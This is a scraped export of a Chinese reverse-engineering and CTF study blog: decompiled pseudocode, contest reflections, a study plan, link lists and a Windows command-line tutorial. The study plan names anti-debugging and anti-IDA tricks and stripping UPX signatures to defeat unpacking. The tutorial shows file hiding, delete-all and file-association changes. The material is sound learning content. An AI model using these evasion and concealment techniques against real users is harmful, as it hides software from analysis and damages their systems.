dword_4F66D8 = _RBX; dword_4F66DC = _RCX; dword_4F66E0 = _RDX; &#125; &#125; &#125; sub_404990(&amp;v142, v64, _RDX, _RCX); v20 = v142; v74 = v143 + v148; v143 += v148; if ( v142 == 6 ) &#123; if ( v74 != 15 &amp;&amp; v74 != 25 ) goto LABEL_107; &#125; else &#123; if ( v142 != 7 ) &#123;LABEL_107: v17 = v143; v18 = v144; v19 = 3; goto LABEL_9; &#125; if ( v74 != 27 ) &#123; if ( v74 == 59 ) &#123; dword_4F664C &amp;= ~0x10000000u; LODWORD(qword_4F6668) = qword_4F6668 &amp; 0xFFFFFFDF; dword_4F6754 &amp;= ~0x200u; &#125; goto LABEL_107; &#125; &#125; v116 = dword_4F6754; LODWORD(qword_4F6668) = qword_4F6668 &amp; 0xFFFFFFDF; dword_4F664C &amp;= ~0x10000000u; BYTE1(v116) = BYTE1(dword_4F6754) &amp; 0xFC | 1; dword_4F6754 = v116; goto LABEL_107;&#125;","tags":["ELF","Linux"],"categories":["Reverse"]},{"title":"CTF习题有感","path":"/re4mile/2021/06/07/ctf/做题反思/ctf/","content":"2022年春秋杯网络安全联赛冬季赛反调试技术从godeep那里见到了一种新的反调试技术 时不时就修改你的IP,我不知道哦它的原理实现 IDC还得好好研究一下IDC,重点是学习IDC函数并灵活运用 傅里叶加密这个算法,我真没研究对 Z3学习一下如何用Z3破解有浮点数的情况吧 PYC其实对字节码的翻译,我的只能翻译简单得分,难了就g VM其实从pyc那里,我联想到了vm 我们为什么不可以直接出一个vm呢 vm的伪代码用pyc的 我们只是在写一个代码模拟运行pyc的数据","tags":["反思"],"categories":["CTF"]},{"title":"任务清单","path":"/re4mile/2021/06/07/other/任务清单/other/","content":"已完成✅ 未完成❌ 信安数学✅欧几里得扩展算法 12https://blog.csdn.net/ash_zheng/article/details/44751697https://blog.csdn.net/AAMahone/article/details/79320635 去百度的话,基本上都是ACM发的贴子,好像讲的很深奥,同时我自己基于原理,逆向出了一套算法 还有几个 ❌还没有用C语言实现几个证明的推导 1234p6:\t引理1-1p7:\t定理1-8,lcm(a,b)= |ab| / gcd(a,b)p8: 引理 1-2p8: 定i1-10 想法迷宫❌实现一个环形的迷宫,正式因为是环形,于是就可以走很多圈,所以得要求走一定的圈数,然后才会进入迷宫 ❌你的地图为什么不可用用稀疏数组来压缩存储呢? ❌可以考虑用双向链表出一迷宫的圆形 ❌我最近在Gitee上发现一个一个什么迷宫生成器或者什么迷宫来着,是汇编写的.你可以去看看,我已经下载了 在E:\\Code\\Project\\asm_for_all-master.zip 记录一次使用free的失败可能是我的代码写的比较复杂,导致一些malloc存在越界写入,于是在free的时候就就很复杂 最后我没有知道我的代码哪里写错了 用了最垃圾的解决办法: 把代码写简单点 但是有个想法 我们可不可以让ctfer去走我们错误的代码? 比如我们写了函数A,在tls的时候,拿了一个基本一模一样的函数B其替换函数A,而且还写入了我们异常的free代码,让程序无法执行 12怀疑free()为什么会失败,是作者的问题?其实ctfer本身就走了一个假的函数 free()失败的原因 对同一个地址free巨多次 内存越界访问 进程A去free进程B,比如我们用的当前模块的malloc,用另外一个dll模块的free来释放 Base58的欧拉函数其实就是复现一下Base58,去理解以前不理解的大数分解 扫雷也就基于之前那个题目做一些修改 主要是它的那个扫雷会比较有趣 插入排序感觉他可以用于加密 下棋比如五子棋, 是不是就是用单链表实现的,用五子棋出一个题目 数据结构CTF: 用链表的存储数据,然后去ctf,会导致更加的难以读取,除非别人只看输入和输出,如果你在过程中做了一些手脚的话,会更加难以识别 关于启动代码为什么你不写一些启动代码来加大寻找main函数的难度呢? 这是可以的,不过启动代码的设计也是比较难的,所以你应该参考一下cfree的 因为cfree5的IDA无法一下子跟到main 变相的思考一下:为什么你不可以把你的main函数封装为一个启动函数,然后塞一个关键代码进去 正负数的概念也就是一个 数 + 正数 等价于一个数-负数 好比10+1&#x3D;&#x3D;19-(-1) 但是对于unsigned char 类型来说 1230x10 + 0x2E==0x10 - 0xD2 注意1+100和1+99是有区别的,就像0xFF不是256那么大一样 2E + D2\t==\t0 循环可以修改栈里面的ip来达到一个循环的效果,这就明显的伪装了一个循环语句 fputc的bugfputchar在写入文件时,对于0xA(回车符)写入的是0x0D0A,也就是写入了换行与回车,这就很g 所以在数据校验的时候,可以想办法利用这个固有的小bug Reverse异常❌SEH，还有就是那2篇文章 PYC逆向❌pyc的那个什么流程图软件,很强大,但是基于Python2,你得学习一下,然后修改过度到Python3 ❌自己定制一个pycdc,于是遇到nop后就可以很好的编译 ❌这个师傅的博客还没有来得及学习 1https://qiumingshanshangdexiaoning.gitee.io/2021/11/28/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%9B%9B%E7%A7%8Dpython%E9%80%86%E5%90%91/#pyc%E6%96%87%E4%BB%B6 ❌把那个花指令总结一下 PE❌ 学习一下&lt;&lt;windwos pe 权威指南&gt;&gt; ❌去学习upx项目的源码 ❌ 学习如何去除upx特征码 ❌ 学习如何去除upx关键信息,如何让upx混淆,让你的upx -d直接失败 Linuxtls❌ 关于before main那个函数到底在哪里寻找,它的出现标志到底是什么,这还是很重要的吧 ptrace❌用它实现一个调试器 123https://www.myhack58.com/Article/html/3/92/2015/68568.htmhttps://www.cnblogs.com/tangr206/articles/3094358.htmlhttps://www.cnblogs.com/axiong/p/6184638.html 花指令❌我记得有个花指令的arc.exe,我还没有再次学习和复现 12学习IDC学习花指令种类 ❌smc多态解密也得学一下,我只是试过简单的原理,如何实现一个大的SMC,涉及一些静态地址该怎么办 反调试1https://github.com/Hipepper/anti_all_in_one/wiki 至少对于我来说的话,如果反调试的代码比较多, 我就不会细看,而是仅仅看反调试在哪里异常或者卡住, 然后跳过那个地方,而不会去关注其它因为反调试而修改的地方,因为它没有影响到我反汇编甚至是F8&#x2F;7, 所以我就不会去关注 ❌反IDA 之前反OD我见过钱老师演示过 这次南邮CTF [WxyVM 0.0.2],直接把IDA给卡住了 看上去很不错的文章 ❌ https://bbs.pediy.com/thread-258353-1.html ❌ https://bbs.pediy.com/thread-224537.htm 阅读技术书籍❌《Linux 二进制分析》 ❌《程序员的自我修养》 ❌《编译原理》 ❌ 龙书,那基本编译原理得学习一下 CTF复现❌ 2022-四川省-re ❌学习vm,到底是一个什么东西 ❌ AES,XXTEA的加密,深入了解一下 ❌ 关于重邮CTF的一些总结 关注CTF比赛 ❌ 收集到这门一个网站 一个没有做的题目 https://qianfei11.github.io/MyOldBlog/2018/08/30/2017-CSAW-Quals-realism/ 其它写一个C语言,清理一下你的Gitee图床,就是进入markdown,搜索关键字符串 1https//resmile.gitee.io/---/xxx.png 然后对比进入墓目录去清理删除,出现了不管,没出现就删除","categories":["other"]},{"title":"好的文章和资源","path":"/re4mile/2021/06/07/other/资源/other/","content":"文章介绍ascii https://ascii.org.cn/ 算法 https://chengzhaoxi.xyz/ windwos 异常 ​ https://zhuanlan.zhihu.com/p/103258431 ​ https://zhuanlan.zhihu.com/p/382909501 Java 尚硅谷: https://pan.baidu.com/s/1Kg7UUpO3wwALX6x28cWA7A 8op3 wp 合集 https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzIzMTc1MjExOQ==&amp;action=getalbum&amp;album_id=1345842232737316865&amp;scene=173&amp;from_msgid=2247507882&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect 花指令 : 如何构造: https://www.52pojie.cn/thread-326995-1-1.html 如何用IDC解决: https://www.cnblogs.com/LyShark/p/13100048.html 汇编指令的一个英文网站,看上去不错,主要介绍指令的 https://www.felixcloutier.com/x86/index.html 一些工具其它iso系统最新版下载 : https://www.imsdn.cn/ 系统内核工具 https://423down.lanzouv.com/b0f1oadze Github资源加速下载网站https://d.serctl.com/ https://doget.nocsdn.com/#/ linux学习的实用网站一般论坛和网站的网站 http://c.biancheng.net/sitemap/ MG-GB ：　https://www.99cankao.com/digital-computation/mb-gb-converter.php 代码格式化 js : https://www.qianbo.com.cn/Tool/Beautify/Js-Formatter.html C语言代码格式化 : https://tool.uvooc.com/formatc/ css 代码格式化 : https://tool.ip138.com/css/ 图片去除底色: https://www.aigei.com/bgremover/ https://picwish.cn/remove-background 图标大全：https://www.aigei.com/icon/class/ 变量命名: Codelf https://unbug.github.io/codelf/ 取照片rgb颜色： https://c.runoob.com/front-end/6214/#f9d94c ico图标生成: http://www.ico51.cn/ gif: https://www.aigei.com/design/pkg/ 免费加速器 https://zhuanlan.zhihu.com/p/468551511 搜索引擎谷歌 https://fsoufsou.com/ 专利申请书范围内容 http://www.soopat.com/ 在线搜索 https://limestart.cn/ RGB颜色 https://www.sioe.cn/yingyong/yanse-rgb-16/ 像素画 http://www.lizibuluo.com/xs 谷歌应用商店 https://chrome.google.com/webstore/detail/%E8%B0%B7%E6%AD%8C%E4%B8%8A%E7%BD%91%E5%8A%A9%E6%89%8B/nonmafimegllfoonjgplbabhmgfanaka/related 130余个实用网站原文链接 https://blog.csdn.net/wucz122140729/article/details/105182717 1、搞学习CSDN： https://www.csdn.net/ C语言技术网：http://www.freecplus.net/ TED（最优质的演讲）：https://www.ted.com/ 谷粉学术： https://gfsoso.99lb.net/scholar.html 大学资源网：http://www.dxzy163.com/ 简答题：http://www.jiandati.com/ 网易公开课：https://open.163.com/ted/ 网易云课堂：https://study.163.com/ 中国大学MOOC：www.icourse163.org 网易云课堂：study.163.com 哔哩哔哩弹幕网： www.bilibili.com 我要自学网： www.51zxw.net 知乎：www.zhihu.com 学堂在线：www.xuetangx.com 爱课程：www.icourses.cn 猫咪论文：https://lunwen.im/ iData（论文搜索）：www.cn-ki.net 文泉考试：https://www.wqkaoshi.com 2、找书籍书栈网（极力推荐）： https://www.bookstack.cn/ 码农之家（计算机电子书下载）：www.xz577.com 鸠摩搜书：www.jiumodiary.com 云海电子图书馆：www.pdfbook.cn 周读（书籍搜索）：ireadweek.com 知轩藏书：http://www.zxcs.me/ 脚本之家电子书下载：https://www.jb51.net/books/ 搜书VIP-电子书搜索：http://www.soshuvip.com/all.html 书格（在线古籍图书馆）：https://new.shuge.org/ caj云阅读：http://cajviewer.cnki.net/cajcloud/ 必看网（人生必看的书籍）：https://www.biikan.com/ 3、冷知识 &#x2F; 黑科技上班摸鱼必备（假装电脑系统升级）： http://fakeupdate.net/ PIECES 拼图（30 个 CSS 碎片进行拼图，呈现 30 种濒临灭绝的动物）：http://www.species-in-pieces.com/ 图片立体像素画： https://pissang.github.io/voxelize-image/ 福利单词（一个不太正经的背单词网站）： http://dict.ftqq.com 查无此人（刷新网站，展现一张AI生成的人脸照片）：https://thispersondoesnotexist.com/ 在线制作地图图例：https://mapchart.net/ 创意光线绘画：http://weavesilk.com/ 星系观察： https://stellarium-web.org/ 煎蛋：http://jandan.net/ 渣男-说话的艺术：https://lovelive.tools/ 全历史：https://www.allhistory.com/ iData：https://www.cn-ki.net/ 术语在线：http://www.termonline.cn/ 4、写代码GitHub：https://github.com/ 码云：https://gitee.com/ 源码之家：https://www.mycodes.net/ JSON to Dart： https://javiercbk.github.io/json_to_dart/ Json在线解析验证： https://www.json.cn/ 在线接口测试（Getman）：https://getman.cn/ freecplus框架：http://www.freecplus.net/ 5、资源搜索DogeDoge搜索引擎：www.dogedoge.com 秘迹搜索：https://mijisou.com/ 小白盘：https://www.xiaobaipan.com/ 云盘精灵（资源搜索）：www.yunpanjingling.com 虫部落（资源搜索）：www.chongbuluo.com 如风搜（资源搜索）：http://www.rufengso.net/ 爱扒：https://www.zyboe.com/ 6、小工具奶牛快传（在线传输文件利器）： cowtransfer.com 文叔叔（大文件传输，不限速）：https://www.wenshushu.cn/ 云端超级应用空间（PS，PPT，Excel，Ai）：https://uzer.me/ 香当网（年终总结，个人简历，事迹材料，租赁合同，演讲稿）：https://www.xiangdang.net/ 二维码生成：https://cli.im/ 搜狗翻译：fanyi.sogou.com 熵数（图表制作，数据可视化）：https://dydata.io/appv2/#/pages/index/home 拷贝兔：https://cp.anyknew.com/ 图片无限变放大：http://bigjpg.com/zh 幕布（在线大纲笔记工具）：mubu.com 在线转换器（在线转换器转换任何测量单位）：https://zh.justcnw.com/ 调查问卷制作：https://www.wenjuan.com/ 果核剥壳（软件下载）：https://www.ghpym.com/ 软件下载：https://www.unyoo.com/ MSDN我告诉你（windows10系统镜像下载）：https://msdn.itellyou.cn/ 7、导航页（工具集）世界各国网址大全： http://www.world68.com/ 小森林导航：http://www.xsldh6.com/ 简捷工具：http://www.shulijp.com/ NiceTool.net 好工具网：http://www.nicetool.net/ 现实君工具箱（综合型在线工具集成网站）：http://tool.uixsj.cn/ 蓝调网站：http://lcoc.top/ 偷渡鱼：https://touduyu.com/ 牛导航：http://www.ziliao6.com/ 小呆导航：https://www.webjike.com/index.html 简法主页：http://www.jianfast.com/ KIM主页：https://kim.plopco.com/ 聚BT：https://jubt.net/cn/index.html 精准云工具合集：https://jingzhunyun.com/ 兔2工具合集：https://www.tool2.cn/ 爱资料工具（在线实用工具集合）：www.toolnb.com 工具导航：https://hao.logosc.cn/ 8、看视频阿木影视： https://www.aosk.online/ 电影推荐（分类别致）：http://www.mvcat.com APP影院：https://app.movie/ 去看TV：https://www.qukantv.net/ 动漫视频网：http://www.zzzfun.com/ 94神马电影网：http://www.9rmb.com/ NO视频官网：http://www.novipnoad.com/ 蓝光画质电影：http://www.languang.co/ 在线看剧：http://dy.27234.cn/ 大数据导航：http://hao.199it.com/ 多功能图片网站：https://www.logosc.cn/so/ 牛牛TV：http://www.ziliao6.com/tv/ VideoFk解析视频：http://www.videofk.com/ 蓝调网站：http://lcoc.top/vip2.3/ 永久资源采集网：http://www.yongjiuzy1.com/ 9、学设计码力全开（产品&#x2F;设计师&#x2F;独立开发者的资源库）：https://www.maliquankai.com/designnav/ 免费音频素材：https://icons8.cn/music 新CG儿（视频素材模板，无水印+免费下载）：https://www.newcger.com/ Iconfont（阿里巴巴矢量图标库）： https://www.iconfont.cn/ 小图标下载：https://www.easyicon.net/ Flight Icon：https://www.flighticon.co/ 第一字体转换器：http://www.diyiziti.com/ doyoudosh（平面设计）：www.doyoudo.com 企业宣传视频在线制作：https://duomu.tv/ MAKE海报设计官网：http://maka.im/ 一键海报神器：https://www.logosc.cn/photo/?utm_source=hao.logosc.cn&amp;utm_medium=referral 字由（字体设计）：http://www.hellofont.cn/ 查字体网站：https://fonts.safe.360.cn/ 爱给网（免费素材下载的网站，包括音效、配乐，3D、视频、游戏，平面、教程）：http://www.aigei.com/ 在线视频剪辑：https://bilibili.clipchamp.com/editor 10、搞文档即书（在线制作PPT）：https://www.keysuper.com/ PDF处理：https://smallpdf.com/cn PDF处理：https://www.ilovepdf.com/zh-cn PDF处理： https://www.pdfpai.com/ PDF处理：https://www.hipdf.cn/ 图片压缩，PDF处理：https://docsmall.com/ 腾讯文档（在线协作编辑和管理文档）：docs.qq.com ProcessOn（在线协作制作结构图）：www.processon.com iLovePDF（在线转换PDF利器）：www.ilovepdf.com PPT在线制作：https://www.woodo.cn/ PDF24工具（pdf处理工具）：https://tools.pdf24.org/en IMGBOT（在线图片处理）：www.imgbot.ai 福昕云编辑（在线编辑PDF）：edit.foxitcloud.cn TinyPNG（在线压缩图片）：tinypng.com UZER.ME（在线使用各种大应用，在线使用CAD，MATLAB，Office三件套 ）：uzer.me 优品PPT（模板下载）： http://www.ypppt.com/ 第一PPT（模板下载）：http://www.1ppt.com/xiazai/ 三顿PPT导航：sandunppt.com Excel函数表：https://support.office.com/zh-cn/article/excel-%E5%87%BD%E6%95%B0%EF%BC%88%E6%8C%89%E5%AD%97%E6%AF%8D%E9%A1%BA%E5%BA%8F%EF%BC%89-b3944572-255d-4efb-bb96-c6d90033e188 11、找图片电脑壁纸：http://lcoc.top/bizhi/ https://unsplash.com/ https://pixabay.com/ https://www.pexels.com/ https://visualhunt.com/ https://www.ssyer.com/ 彼岸图网：http://pic.netbian.com/ 极像素（超高清大图）：https://www.sigoo.com/ 免费版权图片搜索：https://www.logosc.cn/so/ 持续更新中。。。","categories":["资源"]},{"title":"windwos操作系统基础篇","path":"/re4mile/2021/06/07/windows/操作系统基础/windows/","content":"&#x2F;? 可以查看指令的参数 1cd /? 文件和目录cd1234567891011D:\\PowerCmd&gt;cd /?显示当前目录名或改变当前目录。CHDIR [/D] [drive:][path]CHDIR [..]CD [/D] [drive:][path]CD [..] .. 指定要改成父目录。... 首先C盘是无法直接切换到D盘 1c:\\&gt;cd /d d:\\PowerCmd 这样就直接进入了D:\\PowerCmd 123./ 当前路径../\t当前上一级../../\t退2级 dir123d:\\PowerCmd&gt;dir /?显示目录中的文件和子目录列表。 使用dir查看隐藏的文件 123456c:\\&gt;dir /a:H c:\\ c:\\ 的目录2022/09/27 13:07 &lt;DIR&gt; $Recycle.Bin2016/12/14 18:39 389,408 bootmgr 1C:\\Users\\Administrator&gt;dir /o:-n c:\\ 12dir /a查看所有的文件,一览无余 md等效于mkdir 123456789101112131415161718192021222324C:\\Users\\Administrator&gt;md /?创建目录。MKDIR [drive:]pathMD [drive:]path如果命令扩展被启用，MKDIR 会如下改变:如果需要，MKDIR 会在路径中创建中级目录。例如: 假设 \\a 不存在，那么: mkdir \\a\\b\\c\\d与: mkdir \\a chdir \\a mkdir b chdir b mkdir c chdir c mkdir d相同。如果扩展被停用，则需要键入 mkdir \\a\\b\\c\\d。 rd删除一个目录 如果不加参数的话,是删除空目录,若删除的不是空目录就会报错 不加路径,表示当前路径 12345678C:\\Users\\Administrator&gt;rd /?删除一个目录。RMDIR [/S] [/Q] [drive:]pathRD [/S] [/Q] [drive:]path /S 带提示确认的删除所有 /Q 强制删除所有 move123C:\\Users\\Administrator&gt;move /?移动文件并重命名文件和目录。... 12345678D:\\&gt;move d:\\1 d:\\2 重命名目录D:\\&gt;move d:\\tmp.txt d:\\2.txt 重命名文件D:\\&gt;move d:\\2.txt d:\\2\\3 相当于剪切文件 copy123C:\\Users\\Administrator&gt;copy /?将一份或多份文件复制到另一个位置。不是目录.. 12D:\\&gt;copy d:\\tmp\\2.txt d:\\已复制 1 个文件。 复制多个来源,可以用+号连接 1234D:\\&gt;copy q.txt + w.txt sum.txtq.txtw.txt已复制 1 个文件。 它会把文件的内容实现一个拼接的融合 copy con在dos窗口创建一个有文本内容的文件 1234F:\\迅雷下载&gt;copy con test.txtvm4 love play badmatioin!^Z已复制 1 个文件。 attrib test.txt 被作为系统隐藏文件,即使是显示隐藏文件也无法查看,因为他是系统隐藏文件 1attrib +s +a +h test.txt 1234567891011121314151617181920+ 设置属性。- 清除属性。R 只读文件属性。A 存档文件属性。S 系统文件属性。H 隐藏文件属性。O 脱机属性。I 无内容索引文件属性。 X 无清理文件属性。V 完整性属性。P 固定属性。U 非固定属性。[drive:][path][filename] 指定属性要处理的文件。/S 处理当前文件夹及其所有子文件夹中 的匹配文件。/D 也处理文件夹。/L 处理符号链接和 符号链接目标的属性 xcopy1234D:\\&gt;xcopy /?复制文件和目录树。... /S 复制目录和子目录，不包括空目录。 1234D:\\&gt;xcopy /s tmp worktmp\\sum.txt复制了 1 个文件 del12345678D:\\&gt;del /?删除一个或数个文件。del *.txtdel *.zipdel *.* 删除所有del *.*/q 无确认删除所有 12345D:\\&gt;del tmpD:\\tmp\\*, 是否确认(Y/N)? YD:\\&gt;del q.txt fsutil file createnew1fsutil file createnew tmp.txt 1024 会在当前目录创建一个1024字节的空文件,文件的内部是二进制的0 配合使用文件隐藏就很好 assoc显示或修改文件扩展名关联 12assoc .txt=exefile.txt会以exe形式打开,得是管理员才可以执行.而且执行了也不一定对 ren重命名 文本type1234D:\\&gt;type/?显示文本文件的内容。TYPE [drive:][path]filename 12D:\\&gt;type w.txtvmx findstr12345678910111213141516171819202122232425262728293031323334353637383940C:\\Users\\Administrator&gt;findstr /?在文件中寻找字符串。 /B 在一行的开始配对模式。 /E 在一行的结尾配对模式。 /L 按字使用搜索字符串。 /R 将搜索字符串作为一般表达式使用。 /S 在当前目录和所有子目录中搜索匹配文件。 /I 指定搜索不分大小写。 /X 打印完全匹配的行。 /V 只打印不包含匹配的行。 /N 在匹配的每行前打印行数。 /M 如果文件含有匹配项，只打印其文件名。 /O 在每个匹配行前打印字符偏移量。 /P 忽略有不可打印字符的文件。 /OFF[LINE] 不跳过带有脱机属性集的文件。 /A:attr 指定有十六进位数字的颜色属性。请见 &quot;color /?&quot; /F:file 从指定文件读文件列表 (/ 代表控制台)。 /C:string 使用指定字符串作为文字搜索字符串。 /G:file 从指定的文件获得搜索字符串。 (/ 代表控制台)。 /D:dir 查找以分号为分隔符的目录列表 strings 要查找的文字。 [drive:][path]filename 指定要查找的文件。除非参数有 /C 前缀，请使用空格隔开搜索字符串。一般表达式的快速参考: . 通配符: 任何字符 * 重复: 以前字符或类出现零或零以上次数 ^ 行位置: 行的开始 $ 行位置: 行的终点 [class] 字符类: 任何在字符集中的字符 [^class] 补字符类: 任何不在字符集中的字符 [x-y] 范围: 在指定范围内的任何字符 \\x Escape: 元字符 x 的文字用法 \\&lt;xyz 字位置: 字的开始 xyz\\&gt; 字位置: 字的结束有关 FINDSTR 常见表达法的详细情况，请见联机命令参考。 123456D:\\&gt;findstr 192 d:\\ip.txt 查找192开头的行 IPv4 地址 . . . . . . . . . . . . : 192.168.118.133 默认网关. . . . . . . . . . . . . : 192.168.118.2 -n 显示行号 123D:\\&gt;findstr /n 192 d:\\ip.txt9: IPv4 地址 . . . . . . . . . . . . : 192.168.118.13311: 默认网关. . . . . . . . . . . . . : 192.168.118.2 -v 显示除了什么以外的内容 12345678910111213141516171819202122D:\\&gt;findstr /n /v 192 d:\\ip.txt1:2:Windows IP 配置3:4:5:以太网适配器 Ethernet0:6:7: 连接特定的 DNS 后缀 . . . . . . . : localdomain8: 本地链接 IPv6 地址. . . . . . . . : fe80::2532:de6d:dba5:5c3d%210: 子网掩码 . . . . . . . . . . . . : 255.255.255.012:13:隧道适配器 isatap.localdomain:14:15: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接16: 连接特定的 DNS 后缀 . . . . . . . : localdomain17:18:隧道适配器 Teredo Tunneling Pseudo-Interface:19:20: 连接特定的 DNS 后缀 . . . . . . . : 21: IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:20d1:549:3f57:897a22: 本地链接 IPv6 地址. . . . . . . . : fe80::20d1:549:3f57:897a%323: 默认网关. . . . . . . . . . . . . : :: 网络查看Internet协议版本 💻上网需要有2个层面的连接 物理上的连接:插网线或者连接热点 逻辑的连接:获取一个IP地址 IP地址:标识网络的某一台个人PC 子网掩码:标识个人PC的IP地址所处的范围 默认网关:用于标识个人PC直连的路由器的IP地址 DNS服务器: 用于域名解析 netsh interface ip修改IP地址 1netsh interface ip set address &quot;Ethernet0&quot; static 192.168.101.4 255.255.255.0 192.168.101.1 参数 &#x3D; 网卡名字|ip|子网掩码|网关 自动获取IP地址 1netsh interface ip set address &quot;Ethernet0&quot; dhcp 设置DNS 1netsh interface ip set dnsserver &quot;Ethernet0&quot; static 1.1.1.1 可能会报错,但是仍然会生效 添加DNS 12netsh interface ip add dnsserver &quot;Ethernet0&quot; 8.8.4.4 index=1 为第1个添加,如果第1个已经存在,那么第1个移动到第2个,netsh interface ip add dnsserver &quot;Ethernet0&quot; 1.1.1.1 index=2 位第2个添加,如果第一个没有,就给第1个,不给第2个 自动获取DNS 1netsh interface ip set dnsserver &quot;Ethernet0&quot; dhcp 192.168.118.133 ipconfig查看TCP&#x2F;IP数据 123456ipconfig 查看网卡的TCP.IP参数 (IP地址,子网掩码,默认网关)ipconfig /all 查看网卡的TCP.IP参数 (IP地址,子网掩码,默认网关,MAC地址,dhcp地址,dns地址,主机名)ipconfig /release 去除TCP/IP参数ipconfig /renew 重新获取TCP/IP参数ipconfig /flushdns 去除DNS缓存,就是重新从DNS服务器获取数据ipconfig /displaydns ping检测个人PC和对方主机是否能够通信 ping默认发送32字节,发送4次 12345ping www.bing.comping -n 10 www.bing.com 发送10次ping -l 10000 www.bing.com 每次发送10000个字节ping -t www.bing.com 一直放松数据包ping -a 192.168.101.1 好像必须在同一个网段才可以获取名字 tracert获取个人PC到对方主机有多少个路由器 请求超时: 路由器被隐藏或者检测不到 123456789101112131415161718tracert 14.215.177.38 参数可以是域名通过最多 30 个跃点跟踪到 14.215.177.38 的路由 1 &lt;1 毫秒 &lt;1 毫秒 &lt;1 毫秒 192.168.101.1 |内网IP 内网IP 2 2 ms 1 ms 1 ms 10.21.0.1 |内网IP 内网IP 3 * * * 请求超时。 4 * 4 ms * 182.150.111.5 |中国 四川 成都 电信 5 * * * 请求超时。 6 * * * 请求超时。 7 * * * 请求超时。 8 * * * 请求超时。 9 35 ms 76 ms 36 ms 121.14.14.138 |广东省广州市 电信 10 41 ms 41 ms 41 ms 14.215.32.98 |广东省佛山市 电信 11 * * * 请求超时。 12 43 ms 42 ms 42 ms 14.215.177.38 |广东省广州市 电信IDC机房跟踪完成。 无论访问哪个主机,都会先把数据交给直连路由器192.168.101.1,然后再往外访问 如果直连的网关出了问题是无法向外访问数据的,也就是无法上网 route123route -4 print 打印路由表route add 112.53.42.52/31 192.168.101.1 参数是 目标地址 出去的网关 =&gt;添加路由表数据route delete 112.53.42.52 参数是目标地址 删除某个路由条目 如果目标地址是0.0.0.0,代表目标地址是任意网络地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748route -4 print===========================================================================接口列表 8...38 f3 ab fc 87 b7 ......Realtek PCIe GbE Family Controller 14...0a 00 27 00 00 0e ......VirtualBox Host-Only Ethernet Adapter 5...00 50 56 c0 00 01 ......VMware Virtual Ethernet Adapter for VMnet1 9...00 50 56 c0 00 08 ......VMware Virtual Ethernet Adapter for VMnet8 1...........................Software Loopback Interface 1===========================================================================IPv4 路由表===========================================================================活动路由: 网络目标 网络掩码 网关 接口 跃点数 0.0.0.0 0.0.0.0 192.168.101.1 192.168.101.3 281 127.0.0.0 255.0.0.0 在链路上 127.0.0.1 331 127.0.0.1 255.255.255.255 在链路上 127.0.0.1 331 127.255.255.255 255.255.255.255 在链路上 127.0.0.1 331 192.168.0.0 255.255.0.0 在链路上 192.168.101.3 26 192.168.46.0 255.255.255.0 在链路上 192.168.46.1 291 192.168.46.1 255.255.255.255 在链路上 192.168.46.1 291 192.168.46.255 255.255.255.255 在链路上 192.168.46.1 291 192.168.56.0 255.255.255.0 在链路上 192.168.56.1 281 192.168.56.1 255.255.255.255 在链路上 192.168.56.1 281 192.168.56.255 255.255.255.255 在链路上 192.168.56.1 281 192.168.101.0 255.255.255.0 在链路上 192.168.101.3 281 192.168.101.3 255.255.255.255 在链路上 192.168.101.3 281 192.168.101.255 255.255.255.255 在链路上 192.168.101.3 281 192.168.118.0 255.255.255.0 在链路上 192.168.118.1 291 192.168.118.1 255.255.255.255 在链路上 192.168.118.1 291 192.168.118.255 255.255.255.255 在链路上 192.168.118.1 291 192.168.255.255 255.255.255.255 在链路上 192.168.101.3 281 224.0.0.0 240.0.0.0 在链路上 127.0.0.1 331 224.0.0.0 240.0.0.0 在链路上 192.168.56.1 281 224.0.0.0 240.0.0.0 在链路上 192.168.46.1 291 224.0.0.0 240.0.0.0 在链路上 192.168.118.1 291 224.0.0.0 240.0.0.0 在链路上 192.168.101.3 281 255.255.255.255 255.255.255.255 在链路上 127.0.0.1 331 255.255.255.255 255.255.255.255 在链路上 192.168.56.1 281 255.255.255.255 255.255.255.255 在链路上 192.168.46.1 291 255.255.255.255 255.255.255.255 在链路上 192.168.118.1 291 255.255.255.255 255.255.255.255 在链路上 192.168.101.3 281===========================================================================永久路由: 网络地址 网络掩码 网关地址 跃点数 0.0.0.0 0.0.0.0 192.168.101.1 默认=========================================================================== netstat1234567891011121314netstat -anop tcpC:\\Users\\Administrator&gt;netstat -anop tcp 查看活动连接 协议 本地地址 外部地址 状态 PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 1284 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:902 0.0.0.0:0 LISTENING 4240 TCP 0.0.0.0:912 0.0.0.0:0 LISTENING 4240 TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING 7340 TCP 0.0.0.0:6000 0.0.0.0:0 LISTENING 9856 TCP 0.0.0.0:7298 0.0.0.0:0 LISTENING 3908 1netstat -r 可以查看路由表 1netstat -an 查看开启的端口 nslookup就是解析域名用的 12345678910111213141516C:\\Users\\Administrator&gt;nslookup默认服务器: public1.114dns.comAddress: 114.114.114.114&gt; www.baidu.com服务器: public1.114dns.comAddress: 114.114.114.114非权威应答:名称: www.a.shifen.comAddresses: 14.215.177.38 14.215.177.39Aliases: www.baidu.com&gt; easypwd: 查看当前目录 重定向&gt; 输出或者是是重定向 1D:\\&gt;ipconfig &gt; d:\\ip.txt 把ipconfig的内容输出到新建文件d:\\ip.txt中 管道符| 12|把前者的结果当作后者的参数 shutdown 123456shutdown -s -t 10 10s后关闭,无法鼠标取消,只能等死shutdown -a 取消定时shutdown -s -f -t 10 强制关闭shutdown -s -t 10 -c &quot;等死吧&quot; 显示字符串 注销 1logoff 用户管理创建账户用户名:系统使用的显示名 全名: 在登陆时显示的名字,如果不写默认使用用户名 密码需要设置一定的复杂度,也可以通过本地安全策略去修改限制 账号禁用:在创建的时候可以禁用,其他时间不可以禁用, 也可以通过本地安全车略打破限制 注意后面那几个选项 创建账户 123net user dqx /add 创建账户不设置密码net user dqx /add 12822 创建账户设置明文密码net user dqx /add * 创建账户设置隐蔽密码 查看有哪些用户net user 123456net user 查看有哪些用户\\\\WIN-0BTQHJ47VBV 的用户帐户-------------------------------------------------------------------------------Administrator DefaultAccount Guest WDAGUtilityAccount命令成功完成。 查看用户1). 查看当前用户的SID 123456789whoami /user 用户信息----------------用户名 SID============================= ============================================win-0btqhj47vbv\\administrator 